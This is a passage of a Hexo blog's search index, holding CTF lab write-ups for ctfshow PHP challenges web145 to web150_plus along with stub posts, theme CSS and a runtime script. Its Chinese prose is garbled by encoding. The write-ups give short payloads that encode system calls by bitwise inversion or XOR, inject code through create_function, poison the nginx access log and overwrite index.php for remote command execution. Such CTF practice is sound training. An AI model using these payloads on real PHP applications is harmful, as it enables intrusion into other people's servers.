alt="image-20221223211416842"></p><p>å°±æ˜¯å…¶ä»–åŠ å‡ä¹˜é™¤å¼‚æˆ–ç¬¦å·å…¨è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯åœ¨æœ¬åœ°è¯•äº†ä¸‹  |æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¿˜æ˜¯å¯ä»¥ç”¨çš„</p><p>ä½†æ˜¯å–åæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•æ¥è§£</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|</span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211955658.png" alt="image-20221223211955658"></p><p>ç”¨ä¸Šä¸€é¢˜çš„payloadç›´æ¥å°±å¯ä»¥æ‰“é€šå…³äº†</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223212053007.png" alt="image-20221223212053007"></p><p>å‰é¢ç»™è¿‡yuå¸ˆå‚…å†™çš„æ„é€ æ–¹æ³•äº†ï¼Œè¿™é‡Œåœ¨ç»™ä¸€ä¸‹</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223212251086.png" alt="image-20221223212251086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œçš„æ­£åˆ™æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯æ•°å­—å­—æ¯ æ‰€ä»¥å¯ä»¥ç”¨   \   ç»•è¿‡</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯ å¾„ï¼› è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™ æ³•</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”±äºç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—è€ƒè™‘å»æ‰¾ä¸€ä¸ªèƒ½æ‰§è¡Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºçš„å‡½æ•°äº†ï¼Œé‚£ä¹ˆcreate_functino()å°±å¯ä»¥</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223213534323.png" alt="image-20221223213534323"></p><p>è¿™é‡Œçš„æ€è·¯æ˜¯ç”¨}å…ˆæŠŠç¬¬ä¸€ä¸ªifç»™åŒ…å«ä½ï¼Œç„¶ååœ¨è¿›è¡Œrceï¼Œåé¢çš„{æ˜¯ä¸ºäº†æŠŠä¸‹ä¸€è¡Œçš„}ç»™åŒ…å«ä½ï¼Œ#æ˜¯ä¸ºäº†æŠŠ);ç»™æ³¨é‡Šæ‰ã€‚</p><p>ç„¶åå°±å¯ä»¥è¿›è¡Œrceäº†</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223213759296.png" alt="image-20221223213759296"></p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214111128.png" alt="image-20221223214111128"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214505853.png" alt="image-20221223214505853"></p><p>æœ¬åœ°è¯•è¿‡äº†ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥æ‰§è¡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ get_ctfshow_fl0g()</p><p>è¿™æ˜¯è§£æ³•1</p><p><strong>è§£æ³•äºŒ</strong></p><p>ç›´æ¥å¯ä»¥åœ¨evalé‡Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214653400.png" alt="image-20221223214653400"></p><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223221028213.png" alt="image-20221223221028213"></p><p>è¿™é‡Œä¸èƒ½ç”¨å…¶ä»–æ–‡ä»¶æ¥æ–°å»ºçš„åŸå› æ˜¯unlinkå‡½æ•°ä¼šæŠŠå…¶ä»–å‡½æ•°ç»™åˆ é™¤æ‰</p><p>æ‰€ä»¥åªèƒ½è¦†ç›–æ‰index.php</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223221205356.png" alt="image-20221223221205356"></p><p>ç„¶ååœ¨è®¿é—®index.phpï¼Œè¿›è¡Œpost  rce å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224145925518.png" alt="image-20221224145925518"></p><p>è¿™é“é¢˜å¯ä»¥ç”¨æ–‡ä»¶åŒ…å«æ—¥å¿— /var/log/nginx/access.log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°±æ˜¯å› ä¸º$keyä¸ºurl/?åé¢çš„ä¸œè¥¿ï¼Œé‚£ä¹ˆåœ¨extract($_GET);ä¼ isVIPçš„æ—¶å€™ï¼Œå°±è¦æ³¨æ„ä¸èƒ½ä¼ æœ‰å…³æ­£åˆ™åŒ¹é…ä¸­çš„ä¸œè¥¿ï¼Œä¸ç„¶çš„è¯å°±ä¼šä»£ç å°±ä¼šæ‰§è¡Œç»“æŸã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œçš„postä¼ ctfçš„æ—¶å€™ä¸å«:å°±è¡Œï¼Œé‚£ä¹ˆåªè¦ç¬¦åˆä¸Šè¿°æ¡ä»¶å°±è¡Œäº†ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¯ä»¥è€ƒè™‘æ–‡ä»¶åŒ…å«æ—¥å¿—äº†ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224150819031.png" alt="image-20221224150819031"></p><p>æœåŠ¡å™¨æ˜¯nginxçš„ï¼Œé‚£ä¹ˆå°±åˆ©ç”¨nginxçš„é»˜è®¤æ—¥å¿—è·¯å¾„</p><p>åªæœ‰ä¸€æ¬¡æœºä¼šï¼Œå†™é”™äº†å°±å¾—é‡æ–°å¼€ç¯å¢ƒã€‚</p><p><strong>ç¬¬ä¸€æ­¥</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224151001019.png" alt="image-20221224151001019"></p><p><strong>ç¬¬äºŒæ­¥</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194408896.png" alt="image-20221224194408896"></p><p><strong>ç¬¬ä¸‰æ­¥</strong></p><p>è¿›è¡Œrce</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194509564.png" alt="image-20221224194509564"></p><p>æ‹¿åˆ°flag.</p><h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194638649.png" alt="image-20221224194638649"></p><p>è¿™é‡Œä¸ç»™ç”¨æ—¥å¿—åŒ…å«äº†</p><p><strong>é¢˜è§£é‡Š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªé¢˜ä¸€ç‚¹ç‚¹å°å‘__autoload()å‡½æ•°ä¸æ˜¯ç±»é‡Œé¢çš„</span><br><span class="line">__autoload â€” å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line">æœ€åæ„é€ ?..CTFSHOW..=phpinfoå°±å¯ä»¥çœ‹åˆ°phpinfoä¿¡æ¯å•¦</span><br><span class="line">åŸå› æ˜¯..CTFSHOW..è§£æå˜é‡æˆ__CTFSHOW__ç„¶åè¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œå› ä¸ºCTFSHOWæ˜¯ç±»å°±ä¼šä½¿ç”¨</span><br><span class="line">__autoload()å‡½æ•°æ–¹æ³•ï¼Œå»åŠ è½½ï¼Œå› ä¸ºç­‰äºphpinfoå°±ä¼šå»åŠ è½½phpinfo</span><br><span class="line">æ¥ä¸‹æ¥å°±å»getshellå•¦</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224195350241.png" alt="image-20221224195350241"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224195525809.png" alt="image-20221224195525809"></p><p>ç›´æ¥æ‹¿åˆ°flag.</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow PHPç‰¹æ€§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuåˆ·é¢˜è®°å½•</title>
      <link href="/posts/71cd69a5.html"/>
      <url>/posts/71cd69a5.html</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰ä¹Ÿæ˜¯å†™åœ¨äº†csdnä¸Šã€‚</p><p><a href="https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298">https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowå‘½ä»¤æ‰§è¡Œ åˆ·é¢˜è®°å½•</title>
      <link href="/posts/ae291e13.html"/>
      <url>/posts/ae291e13.html</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰å†™åœ¨äº†csdnä¸Š</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128285071">https://blog.csdn.net/qq_63548648/article/details/128285071</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowä¿¡æ¯æ”¶é›† åˆ·é¢˜è®°å½•</title>
      <link href="/posts/de341b7.html"/>
      <url>/posts/de341b7.html</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰ä¹Ÿæ˜¯å†™åœ¨äº†csdn.</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128244465">https://blog.csdn.net/qq_63548648/article/details/128244465</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowçˆ†ç ´ åˆ·é¢˜è®°å½•</title>
      <link href="/posts/1a5a0558.html"/>
      <url>/posts/1a5a0558.html</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰æ²¡å»ºåšå®¢ä¹‹å‰ï¼Œå†™åœ¨äº†csdn,æ‰€ä»¥è¿™é‡Œå°±ç›´æ¥ç”¨csdnçš„é“¾æ¥äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_63548648/article/details/128276536</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow çˆ†ç ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="../images/image-20221226161738079.png" alt="image-20221226161738079"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"ke1nys`Blog","short_name":"ke1nys","theme_color":"#3b70fc","background_color":"#3b70fc","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"/img/siteicon/16.png","sizes":"16x16","type":"image/png"},{"src":"/img/siteicon/32.png","sizes":"32x32","type":"image/png"},{"src":"/img/siteicon/48.png","sizes":"48x48","type":"image/png"},{"src":"/img/siteicon/64.png","sizes":"64x64","type":"image/png"},{"src":"/img/siteicon/128.png","sizes":"128x128","type":"image/png"},{"src":"/img/siteicon/144.png","sizes":"144x144","type":"image/png"},{"src":"/img/siteicon/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {    font-family: ZhuZiAYuanJWD;    src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);    font-display: swap;    font-weight: lighter;  }    div#menus {    font-family: "ZhuZiAYuanJWD";  }  h1#site-title {    font-family: ZhuZiAYuanJWD;    font-size: 3em !important;  }  a.article-title,  a.blog-slider__title,  a.categoryBar-list-link,  h1.post-title {    font-family: ZhuZiAYuanJWD;  }    .iconfont {    font-family: "iconfont" !important;    font-size: 3em;    /* å¯ä»¥å®šä¹‰å›¾æ ‡å¤§å° */    font-style: normal;    -webkit-font-smoothing: antialiased;    -moz-osx-font-smoothing: grayscale;  }    /* æ—¶é—´è½´ç”Ÿè‚–icon */  svg.icon {    /* è¿™é‡Œå®šä¹‰svg.iconï¼Œé¿å…å’ŒButterflyè‡ªå¸¦çš„noteæ ‡ç­¾å†²çª */    width: 1em;    height: 1em;    /* widthå’Œheightå®šä¹‰å›¾æ ‡çš„é»˜è®¤å®½åº¦å’Œé«˜åº¦*/    vertical-align: -0.15em;    fill: currentColor;    overflow: hidden;  }    .icon-zhongbiao::before {    color: #f7c768;  }    /* bilibliç•ªå‰§æ’ä»¶ */  #article-container .bangumi-tab.bangumi-active {    background: var(--anzhiyu-theme);    color: var(--anzhiyu-ahoverbg);    border-radius: 10px;  }  a.bangumi-tab:hover {    text-decoration: none !important;  }  .bangumi-button:hover {    background: var(--anzhiyu-theme) !important;    border-radius: 10px !important;    color: var(--anzhiyu-ahoverbg) !important;  }  a.bangumi-button.bangumi-nextpage:hover {    text-decoration: none !important;  }  .bangumi-button {    padding: 5px 10px !important;  }    a.bangumi-tab {    padding: 5px 10px !important;  }  svg.icon.faa-tada {    font-size: 1.1em;  }  .bangumi-info-item {    border-right: 1px solid #f2b94b;  }  .bangumi-info-item span {    color: #f2b94b;  }  .bangumi-info-item em {    color: #f2b94b;  }    /* è§£å†³artitalkçš„å›¾æ ‡é—®é¢˜ */  #uploadSource > svg {    width: 1.19em;    height: 1.5em;  }    /*top-imgé»‘è‰²é€æ˜ç»ç’ƒæ•ˆæœç§»é™¤ï¼Œä¸å»ºè®®åŠ ï¼Œé™¤éä½ æ‰§ç€äºå®Œå…¨ä¸€å›¾æµæˆ–è€…èƒŒæ™¯å›¾å¯¹æ¯”è‰²æ˜æ˜¾ */  #page-header:not(.not-top-img):before {    background-color: transparent !important;  }    /* é¦–é¡µæ–‡ç« å¡ç‰‡ */  #recent-posts > .recent-post-item {    background: rgba(255, 255, 255, 0.9);  }    /* é¦–é¡µä¾§æ å¡ç‰‡ */  #aside-content .card-widget {    background: rgba(255, 255, 255, 0.9);  }    /* æ–‡ç« é¡µé¢æ­£æ–‡èƒŒæ™¯ */  div#post {    background: rgba(255, 255, 255, 0.9);  }    /* åˆ†é¡µé¡µé¢ */  div#page {    background: rgba(255, 255, 255, 0.9);  }    /* å½’æ¡£é¡µé¢ */  div#archive {    background: rgba(255, 255, 255, 0.9);  }    /* æ ‡ç­¾é¡µé¢ */  div#tag {    background: rgba(255, 255, 255, 0.9);  }    /* åˆ†ç±»é¡µé¢ */  div#category {    background: rgba(255, 255, 255, 0.9);  }    /*å¤œé—´æ¨¡å¼ä¼ªç±»é®ç½©å±‚é€æ˜*/  [data-theme="dark"] #recent-posts > .recent-post-item {    background: #121212;  }    [data-theme="dark"] .card-widget {    background: #121212 !important;  }    [data-theme="dark"] div#post {    background: #121212 !important;  }    [data-theme="dark"] div#tag {    background: #121212 !important;  }    [data-theme="dark"] div#archive {    background: #121212 !important;  }    [data-theme="dark"] div#page {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: transparent !important;  }  /* é¡µè„šé€æ˜ */  #footer {    background: transparent !important;  }    /* å¤´å›¾é€æ˜ */  #page-header {    background: transparent !important;  }    #rightside > div > button {    border-radius: 5px;  }    /* æ»šåŠ¨æ¡ */    ::-webkit-scrollbar {    width: 10px;    height: 10px;  }    ::-webkit-scrollbar-thumb {    background-color: #3b70fc;    border-radius: 2em;  }    ::-webkit-scrollbar-corner {    background-color: transparent;  }    ::-moz-selection {    color: #fff;    background-color: #3b70fc;  }    /* éŸ³ä¹æ’­æ”¾å™¨ */    /* .aplayer .aplayer-lrc {    display: none !important;  } */    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    transition: all 0.3s;    /* é»˜è®¤æƒ…å†µä¸‹ç¼©è¿›å·¦ä¾§66pxï¼Œåªç•™ä¸€ç‚¹ç®­å¤´éƒ¨åˆ† */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    transition: all 0.3s;    /* é¼ æ ‡æ‚¬åœæ˜¯å·¦ä¾§ç¼©è¿›å½’é›¶ï¼Œå®Œå…¨æ˜¾ç¤ºæŒ‰é’® */  }    .aplayer.aplayer-fixed {    z-index: 999999 !important;  }    /* è¯„è®ºæ¡†  */  .vwrap {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 30px 0px;  }    /* è®¾ç½®è¯„è®ºæ¡† */    .vcard {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 0px 0px;  }    /* é¼ æ ‡å›¾æ ‡ */  body {    cursor: url("/img/x1.cur"), auto;  }  a,  [type="button"]:not(:disabled),  [type="reset"]:not(:disabled),  [type="submit"]:not(:disabled),  button:not(:disabled) {    cursor: url("/img/x2.cur"), auto !important;  }  /* mdç½‘ç«™ä¸‹åˆ’çº¿ */  #article-container a:hover {    text-decoration: none !important;  }    #article-container #hpp_talk p img {    display: inline;  }    /* 404é¡µé¢ */  #error-wrap {    position: absolute;    top: 40%;    right: 0;    left: 0;    margin: 0 auto;    padding: 0 1rem;    max-width: 1000px;    transform: translate(0, -50%);  }    #error-wrap .error-content {    display: flex;    flex-direction: row;    justify-content: center;    align-items: center;    margin: 0 1rem;    height: 18rem;    border-radius: 8px;    background: var(--card-bg);    box-shadow: var(--card-box-shadow);    transition: all 0.3s;  }    #error-wrap .error-content .error-img {    box-flex: 1;    flex: 1;    height: 100%;    border-top-left-radius: 8px;    border-bottom-left-radius: 8px;    background-color: #3b70fc;    background-position: center;    background-size: cover;  }    #error-wrap .error-content .error-info {    box-flex: 1;    flex: 1;    padding: 0.5rem;    text-align: center;    font-size: 14px;    font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;  }  #error-wrap .error-content .error-info .error_title {    margin-top: -4rem;    font-size: 9em;  }  #error-wrap .error-content .error-info .error_subtitle {    margin-top: -3.5rem;    word-break: break-word;    font-size: 1.6em;  }  #error-wrap .error-content .error-info a {    display: inline-block;    margin-top: 0.5rem;    padding: 0.3rem 1.5rem;    background: var(--btn-bg);    color: var(--btn-color);  }    #body-wrap.error .aside-list {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    bottom: 0px;    position: absolute;    padding: 1rem;    width: 100%;    overflow: scroll;  }    #body-wrap.error .aside-list .aside-list-group {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    max-width: 1200px;    margin: 0 auto;  }    #body-wrap.error .aside-list .aside-list-item {    padding: 0.5rem;  }    #body-wrap.error .aside-list .aside-list-item img {    width: 100%;    object-fit: cover;    border-radius: 12px;  }    #body-wrap.error .aside-list .aside-list-item .thumbnail {    overflow: hidden;    width: 230px;    height: 143px;    background: var(--anzhiyu-card-bg);    display: flex;  }    #body-wrap.error .aside-list .aside-list-item .content .title {    -webkit-line-clamp: 2;    overflow: hidden;    display: -webkit-box;    -webkit-box-orient: vertical;    line-height: 1.5;    justify-content: center;    align-items: flex-end;    align-content: center;    padding-top: 0.5rem;    color: white;  }    #body-wrap.error .aside-list .aside-list-item .content time {    display: none;  }    /* ä»£ç æ¡†ä¸»é¢˜ */  #article-container figure.highlight {    border-radius: 10px;  }]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime/runtime.js"/>
      <url>/js/runtime/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date; function createtime() { var t = new Date("12/16/2022 00:00:00"); now.setTime(now.getTime() + 250); var e = (now - t) / 1e3 / 60 / 60 / 24, a = Math.floor(e), n = (now - t) / 1e3 / 60 / 60 - 24 * a, r = Math.floor(n); 1 == String(r).length && (r = "0" + r); var s = (now - t) / 1e3 / 60 - 1440 * a - 60 * r, i = Math.floor(s); 1 == String(i).length && (i = "0" + i); var o = (now - t) / 1e3 - 86400 * a - 3600 * r - 60 * i, l = Math.round(o); 1 == String(l).length && (l = "0" + l); let g = ""; g = r < 18 && r >= 9 ? `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/å®‰åªé±¼-ä¸Šç­æ‘¸é±¼ä¸­.svg' title='è·ç¦»æœˆå…¥25kä¹Ÿå°±è¿˜å·®ä¸€ä¸ªå¤§ä½¬å¸¦æˆ‘~'><span class='textTip'> <br> æœ¬ç«™å±…ç„¶è¿è¡Œäº† ${a} å¤©</span><span id='runtime'> ${r} å°æ—¶ ${i} åˆ† ${l} ç§’ </span> <i class='fas fa-heartbeat' style='color:red'></i>` : `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/å®‰åªé±¼-ä¸‹ç­å•¦.svg' title='ä¸‹ç­äº†å°±è¯¥å¼€å¼€å¿ƒå¿ƒçš„ç©è€ï¼Œå˜¿å˜¿~'><span class='textTip'> <br> æœ¬ç«™å±…ç„¶è¿è¡Œäº† ${a} å¤©</span><span id='runtime'> ${r} å°æ—¶ ${i} åˆ† ${l} ç§’ </span> <i class='fas fa-heartbeat' style='color:red'></i>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = g) } setInterval((() => { createtime() }), 250);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime/runtime.min.js"/>
      <url>/js/runtime/runtime.min.js</url>
      
        <content type="html"><![CDATA[var now=new Date;function createtime(){var t=new Date("12/16/2022 00:00:00");now.setTime(now.getTime()+250);var e=(now-t)/1e3/60/60/24,a=Math.floor(e),n=(now-t)/1e3/60/60-24*a,r=Math.floor(n);1==String(r).length&&(r="0"+r);var s=(now-t)/1e3/60-1440*a-60*r,i=Math.floor(s);1==String(i).length&&(i="0"+i);var o=(now-t)/1e3-86400*a-3600*r-60*i,l=Math.round(o);1==String(l).length&&(l="0"+l);let g="";g=r<18&&r>=9?`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/å®‰åªé±¼-ä¸Šç­æ‘¸é±¼ä¸­.svg' title='è·ç¦»æœˆå…¥25kä¹Ÿå°±è¿˜å·®ä¸€ä¸ªå¤§ä½¬å¸¦æˆ‘~'><span class='textTip'> <br> æœ¬ç«™å±…ç„¶è¿è¡Œäº† ${a} å¤©</span><span id='runtime'> ${r} å°æ—¶ ${i} åˆ† ${l} ç§’ </span> <i class='fas fa-heartbeat' style='color:red'></i>`:`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/å®‰åªé±¼-ä¸‹ç­å•¦.svg' title='ä¸‹ç­äº†å°±è¯¥å¼€å¼€å¿ƒå¿ƒçš„ç©è€ï¼Œå˜¿å˜¿~'><span class='textTip'> <br> æœ¬ç«™å±…ç„¶è¿è¡Œäº† ${a} å¤©</span><span id='runtime'> ${r} å°æ—¶ ${i} åˆ† ${l} ç§’ </span> <i class='fas fa-heartbeat' style='color:red'></i>`,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=g)}setInterval(()=>{createtime()},250);]]></content>
      
    </entry>
    
    
  
</search>
